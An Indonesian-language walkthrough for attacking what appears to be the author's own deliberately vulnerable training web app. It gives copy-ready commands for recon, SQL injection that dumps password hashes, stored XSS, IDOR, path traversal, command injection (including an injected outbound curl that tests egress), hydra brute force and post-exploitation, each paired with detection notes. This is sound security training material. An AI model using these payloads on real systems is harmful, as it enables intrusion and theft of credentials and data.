BAB 1Membaca perintah shell (dasar)

Supaya tiap perintah di buku ini masuk akal, pahami dulu anatomi perintah curl.

1.1 Anatomi curl

curl -s -b cookies.txt -X POST "URL" -H 'content-type: application/json' -d 'BODY'
BagianArti
curlProgram untuk mengirim request HTTP dari terminal.
-ssilent — sembunyikan bar progres, tampilkan hanya respons.
-b cookies.txtKirim cookie dari berkas cookies.txt (sesi login Anda).
-c cookies.txtsimpan cookie yang diberikan server ke berkas itu.
-X POSTPilih metode HTTP (GET ambil data, POST kirim data).
"URL"Alamat endpoint tujuan.
-H 'header'Tambah header; content-type: application/json = "body saya JSON".
-d 'BODY'Isi (body) yang dikirim, mis. JSON {"email":...}.
-G --data-urlencode "k=v"Kirim parameter lewat URL (GET) dengan aman ter-encode.
-IMinta hanya header respons (tanpa body) — untuk fingerprint cepat.
| jqSalurkan output ke jq agar JSON tampil rapi & berwarna.
Tanda \ di akhir baris berarti "perintah bersambung ke baris berikut". Anda boleh menyalin seluruh blok sekaligus; shell menganggapnya satu perintah.

BAB 3Login — wajib sebelum menyerang

Inilah penyebab utama perintah Anda gagal sebelumnya: tanpa login, server menolak dengan UNAUTHENTICATED.

3.1 Login & simpan sesi ke cookies.txt

curl -s -c cookies.txt -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
  -H 'content-type: application/json' \
  -d '{"email":"intern@youngowl.lab","password":"sunshine"}'
Penjelasan per bagian:
  • -c cookies.txt — simpan cookie sesi yang diberikan server ke berkas cookies.txt. Inilah yang membuat request berikutnya "dikenali" sebagai sudah login.
  • -X POST — login mengirim data, jadi metodenya POST.
  • -H 'content-type: application/json' — beri tahu server bahwa body berupa JSON.
  • -d '{...}' — kredensial Anda. Ganti password bila Anda sudah mengubahnya.
Kalau muncul "Wrong password for this account." berarti email benar tapi password salah (ini sendiri adalah celah enumerasi — pesan membocorkan bahwa email itu ada). Pakai password yang benar dari tabel 2.2. Kalau muncul "No account uses that email." berarti emailnya yang salah ketik.

3.2 Pastikan sesi berfungsi

curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/assessments" | jq
Penjelasan: -b cookies.txt mengirim cookie sesi tadi. Jika Anda mendapat daftar assessment (bukan UNAUTHENTICATED), berarti sesi aktif dan Anda siap menyerang. Catat salah satu id assessment milik Anda — dipakai di BAB 7 (XSS).

BAB 4Information Gathering

4.1 Header & fingerprint

curl -sI http://72.62.120.97:8080/
whatweb http://72.62.120.97:8080
wafw00f -a http://72.62.120.97:8080
Penjelasan tiap baris:
  • curl -sI — -s senyap, -I ambil hanya header respons (server, bahasa, cookie, header keamanan). Cepat untuk mengenali teknologi.
  • whatweb URL — mengidentifikasi framework/bahasa/library di balik situs.
  • wafw00f -a URL — cek apakah ada Web Application Firewall; -a = coba semua signature, jangan berhenti di yang pertama.

4.2 Breadcrumb dari robots.txt

curl -s http://72.62.120.97:8080/robots.txt
Penjelasan: robots.txt sering menyebut jalur yang ingin "disembunyikan". Perhatikan baris Disallow: — ia menunjuk endpoint /api/v1/system/debug yang Anda pakai di BAB 7.7.
Sisi bertahan: akses robots.txt lalu langsung ke jalur terlarangnya, plus user-agent whatweb/wafw00f → monitor menandai kelas recon.

BAB 5Reconnaissance & Enumerasi

5.1 Port & versi layanan (Nmap)

nmap -sV -sC -p 8080 72.62.120.97
Penjelasan per opsi:
  • nmap — pemetaan jaringan: cek port & layanan.
  • -sV — deteksi versi layanan (penting untuk mencari CVE).
  • -sC — jalankan skrip NSE default (enumerasi ringan).
  • -p 8080 — periksa hanya port 8080 (port lab). Hilangkan untuk memindai lebih luas.
  • 72.62.120.97 — IP target (Nmap bekerja pada IP, bukan URL).

5.2 Content discovery (menemukan endpoint)

ffuf -u http://72.62.120.97:8080/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,401,403,405
Penjelasan per opsi:
  • ffuf — fuzzer HTTP cepat.
  • -u .../FUZZ — URL dengan kata FUZZ sebagai titik yang diganti tiap baris wordlist.
  • -w <file> — wordlist tebakan nama endpoint.
  • -mc 200,401,403,405 — tampilkan hanya status ini. Tips: 401/403 = endpoint ADA tapi butuh login; 405 = ada tapi metodenya beda (mis. hanya POST — petunjuk bagus, seperti pada auth/login).
Sisi bertahan: ratusan 404 beruntun dari satu IP + user-agent ffuf → kelas recon.

BAB 6Vulnerability Scanning

nikto -h http://72.62.120.97:8080

sqlmap -u "http://72.62.120.97:8080/api/v1/targets/search?q=1" \
  --batch --level=2 --risk=2 \
  --cookie="$(grep -oP 'youngowl_session\t\K\S+' cookies.txt 2>/dev/null)"
Penjelasan:
  • nikto -h URL — pindai server web untuk salah konfigurasi & berkas default. -h = host target.
  • sqlmap -u "URL?q=1" — uji apakah parameter q rentan SQLi. Targetnya /api/v1/targets/search?q=1 (punya parameter), bukan /dashboard (tak menerima input).
  • --batch — jawab semua pertanyaan dengan default (tanpa prompt).
  • --level=2 --risk=2 — perluas tempat & jenis payload yang diuji.
  • --cookie=... — endpoint ini butuh login, jadi berikan cookie sesi Anda. (Lebih mudah: salin header Cookie dari Burp.)
Catatan penting: /api/v1/targets/search butuh login. Tanpa cookie, sqlmap hanya akan melihat UNAUTHENTICATED. Login dulu (BAB 3), lalu sertakan cookie di sini.

BAB 7Exploitation (tiap celah)

Semua endpoint di bawah (kecuali 7.7 debug) butuh cookie sesi dari BAB 3. Pastikan cookies.txt sudah berisi sesi yang valid.

7.1 SQL injection (A03) — endpoint pencarian target

# a) Buktikan ada injeksi (satu kutip memecah query)
curl -s -b cookies.txt -G "http://72.62.120.97:8080/api/v1/targets/search" \
  --data-urlencode "q=zzz'"

# b) Tarik flag SQLi via UNION (6 kolom, dari tabel lab_flags)
curl -s -b cookies.txt -G "http://72.62.120.97:8080/api/v1/targets/search" \
  --data-urlencode "q=zzz' UNION SELECT id,name,value,hint,created_at::text,'x' FROM lab_flags-- "

# c) Dampak lebih besar: bocorkan email + hash password pengguna
curl -s -b cookies.txt -G "http://72.62.120.97:8080/api/v1/targets/search" \
  --data-urlencode "q=zzz' UNION SELECT id,email,password_hash,display_name,role_id,is_active::text FROM users-- "
Penjelasan:
  • -b cookies.txt — kirim sesi login (endpoint ini butuh auth).
  • -G --data-urlencode "q=..." — kirim parameter q lewat URL dengan encoding aman, termasuk spasi & kutip.
  • zzz' — satu kutip menutup string SQL lebih awal; server membalas DB_ERROR dan membocorkan query — bukti injeksi.
  • UNION SELECT ... -- — menempel hasil query lain. Query asli memilih 6 kolom, jadi UNION juga 6 kolom. -- (ada spasi di akhir) membuang sisa query asli.
  • FROM lab_flags → kolom value berisi flag SQLi. FROM users → bocorkan email & password_hash.
Jejak: ', UNION, SELECT, -- di parameter → kelas sqli di monitor.

7.2 Stored XSS (A03) — endpoint yang BENAR

Endpoint /api/v1/findings tidak ada (itu sebabnya muncul "Route not found"). XSS tersimpan dilakukan dengan menambah finding (vulnerability) berisi deskripsi HTML ke sebuah assessment, lalu membuka halaman assessment itu.

# Ganti <ID> dengan id assessment milik Anda (dari BAB 3.2)
curl -s -b cookies.txt -X POST \
  "http://72.62.120.97:8080/api/v1/assessments/<ID>/vulnerabilities" \
  -H 'content-type: application/json' \
  -d '{"title":"XSS test","category":"XSS","severity":"MEDIUM","description":"<img src=x onerror=\"document.title='xss-by-me'\">"}'
Penjelasan:
  • URL: /assessments/<ID>/vulnerabilities — menambah finding ke assessment ber-id <ID>.
  • Body wajib berisi title, category, description, dan salah satu dari severity atau cvssVector. Tanpa itu muncul VALIDATION_ERROR.
  • description memuat payload <img onerror> yang disimpan mentah lalu dieksekusi saat halaman assessment dibuka.

Lalu buka di browser: http://72.62.120.97:8080 → assessment tsb. Judul tab berubah = skrip jalan.

Jejak: <img, onerror= di field tersimpan → kelas xss.

7.3 IDOR (A01) — export assessment orang lain

curl -s -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/assessments/<ID-MILIK-ADMIN>/export" | jq
Penjelasan: endpoint export tidak mengecek pemilik. Sebagai user biasa (mis. intern), akses id assessment milik admin. Assessment admin yang privat memuat flag IDOR di deskripsinya. Cari id dengan menebak/menaikkan, atau dari daftar di BAB 3.2.
Jejak: satu akun mengakses export milik akun lain → kelas idor.

7.4 Path traversal (A01)

curl -s -b cookies.txt \
  "http://72.62.120.97:8080/api/v1/files?name=....//secret/flag.txt"
Penjelasan: filter membuang ../ hanya sekali. Input ....// menyusut jadi ../ setelah penyaringan, sehingga lolos keluar dari folder files ke secret/flag.txt yang berisi flag traversal. Tanpa name=, endpoint hanya mendaftar berkas biasa.
Jejak: ../, ....// di parameter → kelas traversal.

7.5 Command injection / RCE (A03)

# Buktikan eksekusi perintah (output id = berhasil)
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" \
  -H 'content-type: application/json' \
  -d '{"host":"localhost; id"}'

# Baca flag RCE dari filesystem lab
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" \
  -H 'content-type: application/json' \
  -d '{"host":"x; cat /tmp/youngowl-lab/.rce/flag"}'
Penjelasan: server menjalankan getent hosts <host> tanpa escape. Karakter ; mengakhiri perintah pertama dan memulai perintah kedua milik Anda (id, lalu cat berkas flag di /tmp/youngowl-lab/.rce/flag). Output ada di field output pada respons JSON.
Jejak: metakarakter shell ; | $( di input → kelas rce (critical).

7.6 Brute force login (A07) — menemukan password intern

hydra -l intern@youngowl.lab -P /usr/share/wordlists/rockyou.txt \
  72.62.120.97 -s 8080 http-post-form \
  "/api/v1/auth/login:email=^USER^&password=^PASS^:No account"
Penjelasan per bagian:
  • -l intern@youngowl.lab — satu username (email) yang dicoba.
  • -P rockyou.txt — daftar password yang ditebak satu per satu.
  • 72.62.120.97 -s 8080 — IP target & port.
  • http-post-form "PATH:BODY:FAIL" — modul form POST. ^USER^/^PASS^ tempat Hydra menyisipkan tebakan; :No account... sebenarnya pakai penanda gagal yang tepat: gunakan :Wrong password karena untuk email yang ADA, pesan gagalnya "Wrong password for this account".
Karena pesan error membedakan email dikenal vs tidak, penanda gagal yang benar untuk intern adalah Wrong password. Password sunshine ada di rockyou.txt, jadi akan ditemukan.

7.7 Misconfiguration / kebocoran rahasia (A05) — tanpa login

curl -s http://72.62.120.97:8080/api/v1/system/debug | jq
Penjelasan: endpoint ini satu-satunya yang tidak butuh login. Ia membocorkan versi, konfigurasi, DATABASE_URL, dan flag debug. | jq merapikan hasilnya.

BAB 8Post-Exploitation (via RCE, di lab)

Hanya di lab Anda. Tujuannya memahami & mendeteksi. Lab memblokir egress & read-only, jadi web shell / reverse shell akan gagal — itu bagian dari pelajaran.

8.1 Orientasi (lewat RCE 7.5)

curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"x; uname -a"}'
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"x; id; pwd; ls -la"}'
Penjelasan: perintah orientasi standar — uname -a (kernel), id (siapa saya; kemungkinan non-root karena container dibatasi), pwd; ls -la (di mana saya & isi folder).

8.2 Uji batas isolasi (harus gagal)

curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"x; curl -m 3 http://example.com"}'
Penjelasan: mencoba koneksi keluar. Karena egress diblokir firewall lab, ini gagal — membuktikan reverse shell/exfiltrasi mandul di lab Anda.

8.3 Perburuan di server Anda (di VPS, bukan Kali)

docker compose -f docker-compose.lab.yml -p youngowl-lab logs -f api
crontab -l ; systemctl list-timers --all ; ss -tlnp
Penjelasan: logs -f mengikuti log container lab secara langsung (cocokkan dengan serangan Anda). Tiga perintah terakhir memeriksa persistence: cron, timer systemd, dan port yang mendengar.
